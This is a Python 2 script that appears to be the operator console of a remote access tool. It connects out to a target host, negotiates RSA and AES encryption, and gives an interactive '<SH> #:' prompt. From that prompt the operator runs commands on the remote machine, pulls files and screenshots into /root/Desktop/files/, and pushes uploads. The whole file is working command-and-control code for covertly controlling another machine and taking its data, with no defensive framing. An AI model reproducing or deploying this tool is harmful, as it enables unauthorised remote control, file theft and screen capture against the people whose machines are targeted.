import socket
import select
from threading import *
import getopt
import sys
import pyttsx
from time import sleep
import os
from Crypto.PublicKey import RSA
from Crypto import Random
from Crypto.Cipher import AES
import base64
from gc import collect
from collections import defaultdict

BLOCK_SIZE = 32
PADDING = '{'
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

screenLock = Semaphore(value=1)
secret = "oooooooooooooooooooooooooooooooo"
cipher = AES.new(secret)

# Generate a private key
def GenerateKey():                                             
	random_generator = Random.new().read
	key = RSA.generate(2048, random_generator)
	return key

#Generate the public key from the private one
def GeneratePublicKey(key):
	public_key = key.publickey()
	return public_key

# Convert the public key so that it can be sent
def PEMPublicKey(key):
	return key.exportKey('PEM')

Private_key = GenerateKey()
Public_Key  = GeneratePublicKey(Private_key)
Public_Key_to_send = PEMPublicKey(Public_Key)

def ComInit(s):
	global Public_Key_to_send
	global secret
	global cipher
	PEM_Public_key = s.recv(1024)
	Public_key_dest = RSA.importKey(PEM_Public_key)
	s.send(Public_Key_to_send)
	Public_key_dest = RSA.importKey(PEM_Public_key)
	secret = Private_key.decrypt(s.recv(1024))
	s.send(Public_key_dest.encrypt(secret,32)[0])
	cipher = AES.new(secret)

ext = ''
didic = {}
didic = defaultdict(lambda: './', didic)
def file_downloading(sock):
	global cipher
	name = raw_input("Give the name of the file: ")
	sock.send(EncodeAES(cipher,"OK"))
	with open("/root/Desktop/files/"+name+"."+ext,"wb") as f :
		while 1:
			data_encoded = sock.recv(1024)
			data = DecodeAES(cipher,data_encoded)
			f.write(data)
			if len(data_encoded) < 1024:
				break

def file_upload(client,path):
	global cipher
	client.send(EncodeAES(cipher,"[+] Ready for Upload!"))
	response=DecodeAES(cipher,client.recv(1024))
	if "OK" in response:
		with open(path,"rb") as f:
			flag=1
			while flag:
				buff=f.read(736)
				if len(buff)<736:
					flag=0
				client.send(EncodeAES(cipher,buff))
				sleep(0.5)
			print "[+] Upload finished!"

def rec(ns):
	global cipher
	msg = ""
	while 1:
		buff = DecodeAES(cipher,ns.recv(1024))
		if len(buff) < 1024:
			msg += buff
			break
		msg += buff
	screenLock.acquire()
	if 'Ready' in msg:
		print 'YES'
		file_downloading(ns)
	else:
		print msg,
	screenLock.release()
def sen(ns):
	global cipher
	global ext
	global di 
	flag = 1
	msg = raw_input("<SH> #:")
	screenLock.acquire()
	if "GET" in msg:
		ext = msg.split('.')[-1]
	elif "exit" in msg:
		ns.close()
		sys.exit(0)
	elif "Screenshot" in msg:
		ext = 'png'
	elif "UP" in msg:
		ns.send(EncodeAES(cipher,msg))
		flag = 0
		file_upload(ns,msg.split('*$:')[2])
	elif "cd" in msg:
		didic[msg.split('*$:')[0]] += msg.split(' ')[-1].strip()
	elif "ls" in msg:
		l = len(msg.split(' '))
		msg1 = msg
		msg = ""
		for i in xrange(0,l-1):
			msg += msg1.split(' ')[i]+" "
		msg += didic[msg.split('*$:')[0]]+msg1.split(' ')[-1].strip()
	if flag:
		ns.send(EncodeAES(cipher,msg))
	screenLock.release()

def Main():
	global msg
	port = 0	
	host = '0.0.0.0'

	if not len(sys.argv[1:]):
		sys.exit(0)	
	try:
		opts,args = getopt.getopt(sys.argv[1:],"h:p:",["host","port"])
	except :
		usage()
		sys.exit(0)
	for o,a in opts:
		if o in ("-p","--port")  :
			port = int(a)
		elif o in ("-h","--host")  :
			host = a

	server=(host,port)
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(server)
	if ComInit(s)==0:
		s.close()
		sys.exit(0)
	print DecodeAES(cipher, s.recv(1024))
	for i in xrange(0,2):
		sen(s)
		rec(s)
	os.system('clear')
	while 1:
		sen(s)
		rec(s)
		msg = ""
		if "exit" in msg:
			break
		collect()
	s.close()
if __name__=='__main__':
	Main()